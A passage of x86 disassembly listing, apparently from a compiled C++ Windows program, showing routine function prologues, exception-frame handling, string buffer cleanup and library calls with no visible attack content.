  405391:	a1 20 a1 40 00       	mov    0x40a120,%eax
  405396:	50                   	push   %eax
  405397:	51                   	push   %ecx
  405398:	68 38 a8 40 00       	push   $0x40a838
  40539d:	51                   	push   %ecx
  40539e:	68 44 a8 40 00       	push   $0x40a844
  4053a3:	51                   	push   %ecx
  4053a4:	68 50 a8 40 00       	push   $0x40a850
  4053a9:	51                   	push   %ecx
  4053aa:	68 5c a8 40 00       	push   $0x40a85c
  4053af:	56                   	push   %esi
  4053b0:	89 7d e8             	mov    %edi,-0x18(%ebp)
  4053b3:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  4053b6:	88 5d d4             	mov    %bl,-0x2c(%ebp)
  4053b9:	e8 e2 c3 ff ff       	call   0x4017a0
  4053be:	83 c4 0c             	add    $0xc,%esp
  4053c1:	50                   	push   %eax
  4053c2:	e8 d9 c3 ff ff       	call   0x4017a0
  4053c7:	83 c4 0c             	add    $0xc,%esp
  4053ca:	50                   	push   %eax
  4053cb:	e8 d0 c3 ff ff       	call   0x4017a0
  4053d0:	83 c4 0c             	add    $0xc,%esp
  4053d3:	50                   	push   %eax
  4053d4:	e8 c7 c3 ff ff       	call   0x4017a0
  4053d9:	83 c4 0c             	add    $0xc,%esp
  4053dc:	8b c8                	mov    %eax,%ecx
  4053de:	ff 15 d0 a0 40 00    	call   *0x40a0d0
  4053e4:	83 7d 94 08          	cmpl   $0x8,-0x6c(%ebp)
  4053e8:	72 0d                	jb     0x4053f7
  4053ea:	8b 4d 80             	mov    -0x80(%ebp),%ecx
  4053ed:	51                   	push   %ecx
  4053ee:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4053f4:	83 c4 04             	add    $0x4,%esp
  4053f7:	33 d2                	xor    %edx,%edx
  4053f9:	be 07 00 00 00       	mov    $0x7,%esi
  4053fe:	c6 45 fc 0a          	movb   $0xa,-0x4(%ebp)
  405402:	83 7d b0 08          	cmpl   $0x8,-0x50(%ebp)
  405406:	89 75 94             	mov    %esi,-0x6c(%ebp)
  405409:	89 5d 90             	mov    %ebx,-0x70(%ebp)
  40540c:	66 89 55 80          	mov    %dx,-0x80(%ebp)
  405410:	72 0d                	jb     0x40541f
  405412:	8b 45 9c             	mov    -0x64(%ebp),%eax
  405415:	50                   	push   %eax
  405416:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  40541c:	83 c4 04             	add    $0x4,%esp
  40541f:	33 c9                	xor    %ecx,%ecx
  405421:	f6 85 74 fe ff ff 08 	testb  $0x8,-0x18c(%ebp)
  405428:	89 75 b0             	mov    %esi,-0x50(%ebp)
  40542b:	89 5d ac             	mov    %ebx,-0x54(%ebp)
  40542e:	66 89 4d 9c          	mov    %cx,-0x64(%ebp)
  405432:	88 9d 7f ff ff ff    	mov    %bl,-0x81(%ebp)
  405438:	c7 85 78 ff ff ff 80 	movl   $0xbb80,-0x88(%ebp)
  40543f:	bb 00 00 
  405442:	c7 85 70 ff ff ff 2c 	movl   $0x12c,-0x90(%ebp)
  405449:	01 00 00 
  40544c:	75 3e                	jne    0x40548c
  40544e:	83 8d 74 fe ff ff 08 	orl    $0x8,-0x18c(%ebp)
  405455:	8b 85 50 fe ff ff    	mov    -0x1b0(%ebp),%eax
  40545b:	8b 10                	mov    (%eax),%edx
  40545d:	8b 8d 60 fe ff ff    	mov    -0x1a0(%ebp),%ecx
  405463:	03 11                	add    (%ecx),%edx
  405465:	89 95 6c fe ff ff    	mov    %edx,-0x194(%ebp)
  40546b:	8b 95 3c fe ff ff    	mov    -0x1c4(%ebp),%edx
  405471:	8b 0a                	mov    (%edx),%ecx
  405473:	8b 00                	mov    (%eax),%eax
  405475:	8b 95 40 fe ff ff    	mov    -0x1c0(%ebp),%edx
  40547b:	8b 12                	mov    (%edx),%edx
  40547d:	51                   	push   %ecx
  40547e:	50                   	push   %eax
  40547f:	52                   	push   %edx
  405480:	8d 8d 2c fe ff ff    	lea    -0x1d4(%ebp),%ecx
  405486:	ff 15 0c a1 40 00    	call   *0x40a10c
  40548c:	8b 85 4c fe ff ff    	mov    -0x1b4(%ebp),%eax
  405492:	8b 30                	mov    (%eax),%esi
  405494:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  40549a:	75 3a                	jne    0x4054d6
  40549c:	8b 0d c4 21 41 00    	mov    0x4121c4,%ecx
  4054a2:	51                   	push   %ecx
  4054a3:	ff 15 14 a0 40 00    	call   *0x40a014
  4054a9:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  4054af:	74 09                	je     0x4054ba
  4054b1:	8b 15 c4 21 41 00    	mov    0x4121c4,%edx
  4054b7:	52                   	push   %edx
  4054b8:	eb 16                	jmp    0x4054d0
  4054ba:	6a 01                	push   $0x1
  4054bc:	ff 15 ec a1 40 00    	call   *0x40a1ec
  4054c2:	a3 c0 21 41 00       	mov    %eax,0x4121c0
  4054c7:	a1 c4 21 41 00       	mov    0x4121c4,%eax
  4054cc:	83 c4 04             	add    $0x4,%esp
  4054cf:	50                   	push   %eax
  4054d0:	ff 15 1c a0 40 00    	call   *0x40a01c
  4054d6:	8d 8d 7f ff ff ff    	lea    -0x81(%ebp),%ecx
  4054dc:	51                   	push   %ecx
  4054dd:	e8 9e ef ff ff       	call   0x404480
  4054e2:	83 c4 04             	add    $0x4,%esp
  4054e5:	56                   	push   %esi
  4054e6:	8d 95 78 ff ff ff    	lea    -0x88(%ebp),%edx
  4054ec:	52                   	push   %edx
  4054ed:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  4054f3:	51                   	push   %ecx
  4054f4:	68 24 a8 40 00       	push   $0x40a824
  4054f9:	8b c8                	mov    %eax,%ecx
  4054fb:	e8 a0 f0 ff ff       	call   0x4045a0
  405500:	f6 85 74 fe ff ff 08 	testb  $0x8,-0x18c(%ebp)
  405507:	74 2c                	je     0x405535
  405509:	8b 95 50 fe ff ff    	mov    -0x1b0(%ebp),%edx
  40550f:	83 a5 74 fe ff ff f7 	andl   $0xfffffff7,-0x18c(%ebp)
  405516:	8b 02                	mov    (%edx),%eax
  405518:	8b 95 6c fe ff ff    	mov    -0x194(%ebp),%edx
  40551e:	8b 8d 40 fe ff ff    	mov    -0x1c0(%ebp),%ecx
  405524:	8b 09                	mov    (%ecx),%ecx
  405526:	52                   	push   %edx
  405527:	50                   	push   %eax
  405528:	51                   	push   %ecx
  405529:	8d 8d 2c fe ff ff    	lea    -0x1d4(%ebp),%ecx
  40552f:	ff 15 0c a1 40 00    	call   *0x40a10c
  405535:	8b 8d 28 fe ff ff    	mov    -0x1d8(%ebp),%ecx
  40553b:	8b 51 04             	mov    0x4(%ecx),%edx
  40553e:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
  405544:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  40554a:	c7 84 15 28 fe ff ff 	movl   $0x40a3b4,-0x1d8(%ebp,%edx,1)
  405551:	b4 a3 40 00 
  405555:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405558:	8d 85 2c fe ff ff    	lea    -0x1d4(%ebp),%eax
  40555e:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  405564:	c7 85 2c fe ff ff 74 	movl   $0x40a374,-0x1d4(%ebp)
  40556b:	a3 40 00 
  40556e:	c6 45 fc 10          	movb   $0x10,-0x4(%ebp)
  405572:	8b 8d 74 fe ff ff    	mov    -0x18c(%ebp),%ecx
  405578:	80 e1 09             	and    $0x9,%cl
  40557b:	80 f9 01             	cmp    $0x1,%cl
  40557e:	75 29                	jne    0x4055a9
  405580:	8b 8d 7c fe ff ff    	mov    -0x184(%ebp),%ecx
  405586:	3b cb                	cmp    %ebx,%ecx
  405588:	74 0d                	je     0x405597
  40558a:	8b 95 3c fe ff ff    	mov    -0x1c4(%ebp),%edx
  405590:	8b 02                	mov    (%edx),%eax
  405592:	50                   	push   %eax
  405593:	ff d1                	call   *%ecx
  405595:	eb 0f                	jmp    0x4055a6
  405597:	8b 85 3c fe ff ff    	mov    -0x1c4(%ebp),%eax
  40559d:	8b 00                	mov    (%eax),%eax
  40559f:	50                   	push   %eax
  4055a0:	ff 15 f0 a1 40 00    	call   *0x40a1f0
  4055a6:	83 c4 04             	add    $0x4,%esp
  4055a9:	83 a5 74 fe ff ff f6 	andl   $0xfffffff6,-0x18c(%ebp)
  4055b0:	8d 8d 2c fe ff ff    	lea    -0x1d4(%ebp),%ecx
  4055b6:	89 9d 70 fe ff ff    	mov    %ebx,-0x190(%ebp)
  4055bc:	c6 45 fc 0f          	movb   $0xf,-0x4(%ebp)
  4055c0:	ff 15 18 a1 40 00    	call   *0x40a118
  4055c6:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  4055cd:	8b 8d 28 fe ff ff    	mov    -0x1d8(%ebp),%ecx
  4055d3:	8b 51 04             	mov    0x4(%ecx),%edx
  4055d6:	a1 b8 a0 40 00       	mov    0x40a0b8,%eax
  4055db:	8d 8d 80 fe ff ff    	lea    -0x180(%ebp),%ecx
  4055e1:	89 84 15 28 fe ff ff 	mov    %eax,-0x1d8(%ebp,%edx,1)
  4055e8:	ff 15 e4 a0 40 00    	call   *0x40a0e4
  4055ee:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4055f1:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4055f8:	59                   	pop    %ecx
  4055f9:	5f                   	pop    %edi
  4055fa:	5e                   	pop    %esi
  4055fb:	5b                   	pop    %ebx
  4055fc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4055ff:	33 cd                	xor    %ebp,%ecx
  405601:	e8 7a 2b 00 00       	call   0x408180
  405606:	8b e5                	mov    %ebp,%esp
  405608:	5d                   	pop    %ebp
  405609:	c3                   	ret
  40560a:	cc                   	int3
  40560b:	cc                   	int3
  40560c:	cc                   	int3
  40560d:	cc                   	int3
  40560e:	cc                   	int3
  40560f:	cc                   	int3
  405610:	55                   	push   %ebp
  405611:	8b ec                	mov    %esp,%ebp
  405613:	6a ff                	push   $0xffffffff
  405615:	68 7f 94 40 00       	push   $0x40947f
  40561a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405620:	50                   	push   %eax
  405621:	81 ec b0 00 00 00    	sub    $0xb0,%esp
  405627:	53                   	push   %ebx
  405628:	56                   	push   %esi
  405629:	a1 18 e0 40 00       	mov    0x40e018,%eax
  40562e:	33 c5                	xor    %ebp,%eax
  405630:	50                   	push   %eax
  405631:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405634:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40563a:	33 db                	xor    %ebx,%ebx
  40563c:	8d 45 f3             	lea    -0xd(%ebp),%eax
  40563f:	68 80 bb 00 00       	push   $0xbb80
  405644:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  405647:	50                   	push   %eax
  405648:	88 5d f3             	mov    %bl,-0xd(%ebp)
  40564b:	e8 30 ee ff ff       	call   0x404480
  405650:	83 c4 04             	add    $0x4,%esp
  405653:	8b c8                	mov    %eax,%ecx
  405655:	ff 15 d4 a2 40 00    	call   *0x40a2d4
  40565b:	84 c0                	test   %al,%al
  40565d:	0f 84 43 02 00 00    	je     0x4058a6
  405663:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  405666:	c7 85 48 ff ff ff b8 	movl   $0x40a3b8,-0xb8(%ebp)
  40566d:	a3 40 00 
  405670:	ff 15 dc a0 40 00    	call   *0x40a0dc
  405676:	53                   	push   %ebx
  405677:	53                   	push   %ebx
  405678:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  40567e:	51                   	push   %ecx
  40567f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  405682:	8d 8d 48 ff ff ff    	lea    -0xb8(%ebp),%ecx
  405688:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  40568f:	ff 15 d8 a0 40 00    	call   *0x40a0d8
  405695:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40569c:	8b 95 48 ff ff ff    	mov    -0xb8(%ebp),%edx
  4056a2:	8b 42 04             	mov    0x4(%edx),%eax
  4056a5:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  4056ab:	c7 84 05 48 ff ff ff 	movl   $0x40a3b4,-0xb8(%ebp,%eax,1)
  4056b2:	b4 a3 40 00 
  4056b6:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  4056b9:	ff 15 1c a1 40 00    	call   *0x40a11c
  4056bf:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  4056c3:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  4056c9:	c7 85 4c ff ff ff 74 	movl   $0x40a374,-0xb4(%ebp)
  4056d0:	a3 40 00 
  4056d3:	ff 15 04 a1 40 00    	call   *0x40a104
  4056d9:	c7 45 88 20 00 00 00 	movl   $0x20,-0x78(%ebp)
  4056e0:	89 5d 8c             	mov    %ebx,-0x74(%ebp)
  4056e3:	89 5d 90             	mov    %ebx,-0x70(%ebp)
  4056e6:	89 5d 98             	mov    %ebx,-0x68(%ebp)
  4056e9:	89 5d 9c             	mov    %ebx,-0x64(%ebp)
  4056ec:	c7 45 94 04 00 00 00 	movl   $0x4,-0x6c(%ebp)
  4056f3:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  4056fa:	8b 15 20 a1 40 00    	mov    0x40a120,%edx
  405700:	52                   	push   %edx
  405701:	51                   	push   %ecx
  405702:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
  405708:	68 88 a8 40 00       	push   $0x40a888
  40570d:	50                   	push   %eax
  40570e:	e8 8d c0 ff ff       	call   0x4017a0
  405713:	83 c4 0c             	add    $0xc,%esp
  405716:	8b c8                	mov    %eax,%ecx
  405718:	ff 15 d0 a0 40 00    	call   *0x40a0d0
  40571e:	f6 45 94 08          	testb  $0x8,-0x6c(%ebp)
  405722:	88 5d f3             	mov    %bl,-0xd(%ebp)
  405725:	c7 45 ec 80 bb 00 00 	movl   $0xbb80,-0x14(%ebp)
  40572c:	c7 45 e8 34 01 00 00 	movl   $0x134,-0x18(%ebp)
  405733:	75 35                	jne    0x40576a
  405735:	83 4d 94 08          	orl    $0x8,-0x6c(%ebp)
  405739:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  40573f:	8b 08                	mov    (%eax),%ecx
  405741:	8b 55 80             	mov    -0x80(%ebp),%edx
  405744:	03 0a                	add    (%edx),%ecx
  405746:	8b 95 60 ff ff ff    	mov    -0xa0(%ebp),%edx
  40574c:	89 4d 8c             	mov    %ecx,-0x74(%ebp)
  40574f:	8b 8d 5c ff ff ff    	mov    -0xa4(%ebp),%ecx
  405755:	8b 09                	mov    (%ecx),%ecx
  405757:	8b 00                	mov    (%eax),%eax
  405759:	8b 12                	mov    (%edx),%edx
  40575b:	51                   	push   %ecx
  40575c:	50                   	push   %eax
  40575d:	52                   	push   %edx
  40575e:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  405764:	ff 15 0c a1 40 00    	call   *0x40a10c
  40576a:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  405770:	8b 30                	mov    (%eax),%esi
  405772:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  405778:	75 3a                	jne    0x4057b4
  40577a:	8b 0d c4 21 41 00    	mov    0x4121c4,%ecx
  405780:	51                   	push   %ecx
  405781:	ff 15 14 a0 40 00    	call   *0x40a014
  405787:	39 1d c0 21 41 00    	cmp    %ebx,0x4121c0
  40578d:	74 09                	je     0x405798
  40578f:	8b 15 c4 21 41 00    	mov    0x4121c4,%edx
  405795:	52                   	push   %edx
  405796:	eb 16                	jmp    0x4057ae
  405798:	6a 01                	push   $0x1
  40579a:	ff 15 ec a1 40 00    	call   *0x40a1ec
  4057a0:	a3 c0 21 41 00       	mov    %eax,0x4121c0
  4057a5:	a1 c4 21 41 00       	mov    0x4121c4,%eax
  4057aa:	83 c4 04             	add    $0x4,%esp
  4057ad:	50                   	push   %eax
  4057ae:	ff 15 1c a0 40 00    	call   *0x40a01c
  4057b4:	8d 4d f3             	lea    -0xd(%ebp),%ecx
  4057b7:	51                   	push   %ecx
  4057b8:	e8 c3 ec ff ff       	call   0x404480
  4057bd:	83 c4 04             	add    $0x4,%esp
  4057c0:	56                   	push   %esi
  4057c1:	8d 55 ec             	lea    -0x14(%ebp),%edx
  4057c4:	52                   	push   %edx
  4057c5:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  4057c8:	51                   	push   %ecx
  4057c9:	68 24 a8 40 00       	push   $0x40a824
  4057ce:	8b c8                	mov    %eax,%ecx
  4057d0:	e8 cb ed ff ff       	call   0x4045a0
  4057d5:	f6 45 94 08          	testb  $0x8,-0x6c(%ebp)
  4057d9:	74 26                	je     0x405801
  4057db:	8b 95 70 ff ff ff    	mov    -0x90(%ebp),%edx
  4057e1:	83 65 94 f7          	andl   $0xfffffff7,-0x6c(%ebp)
  4057e5:	8b 02                	mov    (%edx),%eax
  4057e7:	8b 55 8c             	mov    -0x74(%ebp),%edx
  4057ea:	8b 8d 60 ff ff ff    	mov    -0xa0(%ebp),%ecx
  4057f0:	8b 09                	mov    (%ecx),%ecx
  4057f2:	52                   	push   %edx
  4057f3:	50                   	push   %eax
  4057f4:	51                   	push   %ecx
  4057f5:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  4057fb:	ff 15 0c a1 40 00    	call   *0x40a10c
  405801:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  405807:	8b 51 04             	mov    0x4(%ecx),%edx
  40580a:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40580d:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405810:	c7 84 15 48 ff ff ff 	movl   $0x40a3b4,-0xb8(%ebp,%edx,1)
  405817:	b4 a3 40 00 
  40581b:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  405822:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
  405828:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40582b:	c7 85 4c ff ff ff 74 	movl   $0x40a374,-0xb4(%ebp)
  405832:	a3 40 00 
  405835:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  405839:	8b 4d 94             	mov    -0x6c(%ebp),%ecx
  40583c:	80 e1 09             	and    $0x9,%cl
  40583f:	80 f9 01             	cmp    $0x1,%cl
  405842:	75 26                	jne    0x40586a
  405844:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  405847:	3b cb                	cmp    %ebx,%ecx
  405849:	74 0d                	je     0x405858
  40584b:	8b 95 5c ff ff ff    	mov    -0xa4(%ebp),%edx
  405851:	8b 02                	mov    (%edx),%eax
  405853:	50                   	push   %eax
  405854:	ff d1                	call   *%ecx
  405856:	eb 0f                	jmp    0x405867
  405858:	8b 85 5c ff ff ff    	mov    -0xa4(%ebp),%eax
  40585e:	8b 00                	mov    (%eax),%eax
  405860:	50                   	push   %eax
  405861:	ff 15 f0 a1 40 00    	call   *0x40a1f0
  405867:	83 c4 04             	add    $0x4,%esp
  40586a:	83 65 94 f6          	andl   $0xfffffff6,-0x6c(%ebp)
  40586e:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  405874:	89 5d 90             	mov    %ebx,-0x70(%ebp)
  405877:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  40587b:	ff 15 18 a1 40 00    	call   *0x40a118
  405881:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  405888:	8b 8d 48 ff ff ff    	mov    -0xb8(%ebp),%ecx
  40588e:	8b 51 04             	mov    0x4(%ecx),%edx
  405891:	a1 b8 a0 40 00       	mov    0x40a0b8,%eax
  405896:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  405899:	89 84 15 48 ff ff ff 	mov    %eax,-0xb8(%ebp,%edx,1)
  4058a0:	ff 15 e4 a0 40 00    	call   *0x40a0e4
  4058a6:	e8 05 eb ff ff       	call   0x4043b0
  4058ab:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4058ae:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4058b5:	59                   	pop    %ecx
  4058b6:	5e                   	pop    %esi
  4058b7:	5b                   	pop    %ebx
  4058b8:	8b e5                	mov    %ebp,%esp
  4058ba:	5d                   	pop    %ebp
  4058bb:	c3                   	ret
  4058bc:	cc                   	int3
  4058bd:	cc                   	int3
  4058be:	cc                   	int3
  4058bf:	cc                   	int3
  4058c0:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4058c4:	72 0c                	jb     0x4058d2
  4058c6:	8b 06                	mov    (%esi),%eax
  4058c8:	50                   	push   %eax
  4058c9:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4058cf:	83 c4 04             	add    $0x4,%esp
  4058d2:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4058d9:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4058e0:	c6 06 00             	movb   $0x0,(%esi)
  4058e3:	c3                   	ret
  4058e4:	cc                   	int3
  4058e5:	cc                   	int3
  4058e6:	cc                   	int3
  4058e7:	cc                   	int3
  4058e8:	cc                   	int3
  4058e9:	cc                   	int3
  4058ea:	cc                   	int3
  4058eb:	cc                   	int3
  4058ec:	cc                   	int3
  4058ed:	cc                   	int3
  4058ee:	cc                   	int3
  4058ef:	cc                   	int3
  4058f0:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  4058f4:	72 0c                	jb     0x405902
  4058f6:	8b 06                	mov    (%esi),%eax
  4058f8:	50                   	push   %eax
  4058f9:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4058ff:	83 c4 04             	add    $0x4,%esp
  405902:	33 c9                	xor    %ecx,%ecx
  405904:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  40590b:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  405912:	66 89 0e             	mov    %cx,(%esi)
  405915:	c3                   	ret
  405916:	cc                   	int3
  405917:	cc                   	int3
  405918:	cc                   	int3
  405919:	cc                   	int3
  40591a:	cc                   	int3
  40591b:	cc                   	int3
  40591c:	cc                   	int3
  40591d:	cc                   	int3
  40591e:	cc                   	int3
  40591f:	cc                   	int3
  405920:	8b 47 10             	mov    0x10(%edi),%eax
  405923:	83 c9 ff             	or     $0xffffffff,%ecx
  405926:	2b c8                	sub    %eax,%ecx
  405928:	83 f9 01             	cmp    $0x1,%ecx
  40592b:	77 0b                	ja     0x405938
  40592d:	68 98 a8 40 00       	push   $0x40a898
  405932:	ff 15 38 a1 40 00    	call   *0x40a138
  405938:	56                   	push   %esi
  405939:	8d 70 01             	lea    0x1(%eax),%esi
  40593c:	8b c7                	mov    %edi,%eax
  40593e:	e8 5d 1b 00 00       	call   0x4074a0
  405943:	84 c0                	test   %al,%al
  405945:	74 33                	je     0x40597a
  405947:	8b 4f 10             	mov    0x10(%edi),%ecx
  40594a:	ba 08 00 00 00       	mov    $0x8,%edx
  40594f:	39 57 14             	cmp    %edx,0x14(%edi)
  405952:	72 04                	jb     0x405958
  405954:	8b 07                	mov    (%edi),%eax
  405956:	eb 02                	jmp    0x40595a
  405958:	8b c7                	mov    %edi,%eax
  40595a:	66 89 1c 48          	mov    %bx,(%eax,%ecx,2)
  40595e:	89 77 10             	mov    %esi,0x10(%edi)
  405961:	39 57 14             	cmp    %edx,0x14(%edi)
  405964:	72 0c                	jb     0x405972
  405966:	8b 07                	mov    (%edi),%eax
  405968:	33 d2                	xor    %edx,%edx
  40596a:	66 89 14 70          	mov    %dx,(%eax,%esi,2)
  40596e:	8b c7                	mov    %edi,%eax
  405970:	5e                   	pop    %esi
  405971:	c3                   	ret
  405972:	8b c7                	mov    %edi,%eax
  405974:	33 d2                	xor    %edx,%edx
  405976:	66 89 14 70          	mov    %dx,(%eax,%esi,2)
  40597a:	8b c7                	mov    %edi,%eax
  40597c:	5e                   	pop    %esi
  40597d:	c3                   	ret
  40597e:	cc                   	int3
  40597f:	cc                   	int3
  405980:	55                   	push   %ebp
  405981:	8b ec                	mov    %esp,%ebp
  405983:	51                   	push   %ecx
  405984:	57                   	push   %edi
  405985:	8b f8                	mov    %eax,%edi
  405987:	33 c0                	xor    %eax,%eax
  405989:	50                   	push   %eax
  40598a:	89 47 10             	mov    %eax,0x10(%edi)
  40598d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405990:	8b 45 08             	mov    0x8(%ebp),%eax
  405993:	33 c9                	xor    %ecx,%ecx
  405995:	c7 47 14 07 00 00 00 	movl   $0x7,0x14(%edi)
  40599c:	52                   	push   %edx
  40599d:	66 89 0f             	mov    %cx,(%edi)
  4059a0:	e8 9b 0d 00 00       	call   0x406740
  4059a5:	8b c7                	mov    %edi,%eax
  4059a7:	5f                   	pop    %edi
  4059a8:	8b e5                	mov    %ebp,%esp
  4059aa:	5d                   	pop    %ebp
  4059ab:	c2 04 00             	ret    $0x4
  4059ae:	cc                   	int3
  4059af:	cc                   	int3
  4059b0:	56                   	push   %esi
  4059b1:	8b f1                	mov    %ecx,%esi
  4059b3:	f6 46 40 01          	testb  $0x1,0x40(%esi)
  4059b7:	c7 06 f4 a8 40 00    	movl   $0x40a8f4,(%esi)
  4059bd:	74 0f                	je     0x4059ce
  4059bf:	8b 46 10             	mov    0x10(%esi),%eax
  4059c2:	8b 08                	mov    (%eax),%ecx
  4059c4:	51                   	push   %ecx
  4059c5:	ff 15 e8 a1 40 00    	call   *0x40a1e8
  4059cb:	83 c4 04             	add    $0x4,%esp
  4059ce:	8b 56 10             	mov    0x10(%esi),%edx
  4059d1:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  4059d7:	8b 46 20             	mov    0x20(%esi),%eax
  4059da:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4059e0:	8b 4e 30             	mov    0x30(%esi),%ecx
  4059e3:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  4059e9:	8b 56 14             	mov    0x14(%esi),%edx
  4059ec:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  4059f2:	8b 46 24             	mov    0x24(%esi),%eax
  4059f5:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4059fb:	8b 4e 34             	mov    0x34(%esi),%ecx
  4059fe:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  405a04:	83 66 40 fe          	andl   $0xfffffffe,0x40(%esi)
  405a08:	c7 46 3c 00 00 00 00 	movl   $0x0,0x3c(%esi)
  405a0f:	8b ce                	mov    %esi,%ecx
  405a11:	5e                   	pop    %esi
  405a12:	ff 25 a4 a0 40 00    	jmp    *0x40a0a4
  405a18:	cc                   	int3
  405a19:	cc                   	int3
  405a1a:	cc                   	int3
  405a1b:	cc                   	int3
  405a1c:	cc                   	int3
  405a1d:	cc                   	int3
  405a1e:	cc                   	int3
  405a1f:	cc                   	int3
  405a20:	55                   	push   %ebp
  405a21:	8b ec                	mov    %esp,%ebp
  405a23:	83 ec 08             	sub    $0x8,%esp
  405a26:	56                   	push   %esi
  405a27:	8b f1                	mov    %ecx,%esi
  405a29:	f6 46 40 08          	testb  $0x8,0x40(%esi)
  405a2d:	57                   	push   %edi
  405a2e:	74 23                	je     0x405a53
  405a30:	8b 56 24             	mov    0x24(%esi),%edx
  405a33:	8b 02                	mov    (%edx),%eax
  405a35:	85 c0                	test   %eax,%eax
  405a37:	74 1a                	je     0x405a53
  405a39:	8b 4e 3c             	mov    0x3c(%esi),%ecx
  405a3c:	3b c1                	cmp    %ecx,%eax
  405a3e:	73 13                	jae    0x405a53
  405a40:	8b 7e 34             	mov    0x34(%esi),%edi
  405a43:	8b 3f                	mov    (%edi),%edi
  405a45:	8d 04 78             	lea    (%eax,%edi,2),%eax
  405a48:	2b c1                	sub    %ecx,%eax
  405a4a:	89 0a                	mov    %ecx,(%edx)
  405a4c:	8b 4e 34             	mov    0x34(%esi),%ecx
  405a4f:	d1 f8                	sar    $1,%eax
  405a51:	89 01                	mov    %eax,(%ecx)
  405a53:	66 8b 7d 08          	mov    0x8(%ebp),%di
  405a57:	ba ff ff 00 00       	mov    $0xffff,%edx
  405a5c:	66 3b d7             	cmp    %di,%dx
  405a5f:	75 0a                	jne    0x405a6b
  405a61:	5f                   	pop    %edi
  405a62:	33 c0                	xor    %eax,%eax
  405a64:	5e                   	pop    %esi
  405a65:	8b e5                	mov    %ebp,%esp
  405a67:	5d                   	pop    %ebp
  405a68:	c2 04 00             	ret    $0x4
  405a6b:	8b 46 24             	mov    0x24(%esi),%eax
  405a6e:	8b 08                	mov    (%eax),%ecx
  405a70:	85 c9                	test   %ecx,%ecx
  405a72:	74 24                	je     0x405a98
  405a74:	8b 56 34             	mov    0x34(%esi),%edx
  405a77:	8b 12                	mov    (%edx),%edx
  405a79:	8b c1                	mov    %ecx,%eax
  405a7b:	8d 14 50             	lea    (%eax,%edx,2),%edx
  405a7e:	3b c2                	cmp    %edx,%eax
  405a80:	73 16                	jae    0x405a98
  405a82:	8b ce                	mov    %esi,%ecx
  405a84:	ff 15 50 a1 40 00    	call   *0x40a150
  405a8a:	66 89 38             	mov    %di,(%eax)
  405a8d:	66 8b c7             	mov    %di,%ax
  405a90:	5f                   	pop    %edi
  405a91:	5e                   	pop    %esi
  405a92:	8b e5                	mov    %ebp,%esp
  405a94:	5d                   	pop    %ebp
  405a95:	c2 04 00             	ret    $0x4
  405a98:	f6 46 40 02          	testb  $0x2,0x40(%esi)
  405a9c:	74 0d                	je     0x405aab
  405a9e:	5f                   	pop    %edi
  405a9f:	b8 ff ff 00 00       	mov    $0xffff,%eax
  405aa4:	5e                   	pop    %esi
